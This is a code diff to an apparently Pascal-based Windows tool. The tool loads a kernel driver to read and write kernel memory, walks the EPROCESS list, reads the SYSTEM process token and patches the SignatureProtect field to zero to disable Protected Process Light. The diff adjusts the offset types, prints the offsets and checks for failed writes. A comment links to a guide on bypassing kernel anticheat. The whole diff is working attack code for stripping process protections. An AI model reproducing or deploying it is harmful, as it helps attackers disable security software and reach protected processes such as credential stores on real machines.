@@ -6,9 +6,9 @@ uses windows,sysutils, udrv, urtcore, untdll;
 
 type toffsets=record
       EprocessNext:word;
-      Token:dword;
-      SignatureProtect:dword;
-      ImageFileName:dword;
+      Token:word;
+      SignatureProtect:word;
+      ImageFileName:word;
 end;
 
 
@@ -116,7 +116,7 @@ WriteLn ('KernelBaseAddr:'+inttohex(NtoskrnlBaseAddress,sizeof(nativeuint)));
     SystemProcessToken := ReadMemoryDWORD64(Device, PsInitialSystemProcessAddress + offsets.Token) and not 15;
     WriteLn('UniqueProcessId:'+inttohex(UniqueProcessId,sizeof(nativeuint))+';'+imagefilename);
     SystemProcessFlink:= ReadMemoryDWORD64(Device, PsInitialSystemProcessAddress + offsets.EprocessNext);
-    WriteLn('ActiveProcessLinks:'+inttohex(SystemProcessFlink,sizeof(nativeuint)));
+    //WriteLn('SystemProcessFlink:'+inttohex(SystemProcessFlink,sizeof(nativeuint)));
     writeln('*************************');
     next:=SystemProcessFlink;  //first LIST_ENTRY
     if UniqueProcessId=4 then //safety check
@@ -125,7 +125,7 @@ WriteLn ('KernelBaseAddr:'+inttohex(NtoskrnlBaseAddress,sizeof(nativeuint)));
     begin
           UniqueProcessId:=ReadMemoryDWORD64(Device, next-8);
           imagefilename:=ReadMemory16bytes(Device, next-offsets.EprocessNext+offsets.ImageFileName);
-          protection :=ReadMemoryDword(Device, next-offsets.EprocessNext+offsets.SignatureProtect);
+          protection :=ReadMemoryDword(Device, next-dword64(offsets.EprocessNext)+dword64(offsets.SignatureProtect));
           if (UniqueProcessId<4) or (UniqueProcessId>$FFFF) then break;
 
           if action=0
@@ -142,7 +142,8 @@ WriteLn ('KernelBaseAddr:'+inttohex(NtoskrnlBaseAddress,sizeof(nativeuint)));
              if (action=1) and (offsets.SignatureProtect<>0) then
                 begin
                 writeln('patching process protection:'+inttostr(UniqueProcessId ));
-                WriteMemoryPrimitive (device,4,next-offsets.EprocessNext+offsets.SignatureProtect,0);  //disable PPL
+                if WriteMemoryPrimitive (device,4,next-dword64(offsets.EprocessNext)+dword64(offsets.SignatureProtect),0)=false  //disable PPL
+                                        then writeln('WriteMemoryPrimitive failed');
                 //WriteMemoryPrimitive (device,4,next-offsets.EprocessNext+offsets.SignatureProtect,$00623F3F); //enable PPL
                 end;
              //https://www.geeksforgeeks.org/bitwise-operators-in-c-cpp/
@@ -215,11 +216,17 @@ end;
 //https://guidedhacking.com/threads/how-to-bypass-kernel-anticheat-develop-drivers.11325/
 begin
 if paramcount=0 then exit;
+//
 ReleaseID:=ReadRegEntry ('SOFTWARE\Microsoft\Windows NT\CurrentVersion','ReleaseID' );
 if ReleaseID ='' then ReleaseID :=ReadRegEntry ('SOFTWARE\Microsoft\Windows NT\CurrentVersion','CurrentBuildNumber' );
 if ReleaseID ='' then begin writeln('No ReleaseID');exit;end;
 writeln('ReleaseID:'+releaseid);
 if SetOffsets =false then begin writeln('Offsets unknown');exit; end;
+writeln('EprocessNext:'+inttohex(offsets.EprocessNext,sizeof(offsets.EprocessNext)));
+writeln('SignatureProtect:'+inttohex(offsets.SignatureProtect,sizeof(offsets.SignatureProtect)));
+writeln('Token:'+inttohex(offsets.Token ,sizeof(offsets.Token)));
+writeln('ImageFileName:'+inttohex(offsets.ImageFileName,sizeof(offsets.ImageFileName)));
+//
 if (paramcount=2) and (paramstr(1)='load')
    then LoadDriver (ParamStr (2),stringreplace(ExtractFileName (ParamStr (2)),ExtractFileExt (ParamStr (2)),'',[]));
 if (paramcount=2) and (paramstr(1)='unload')
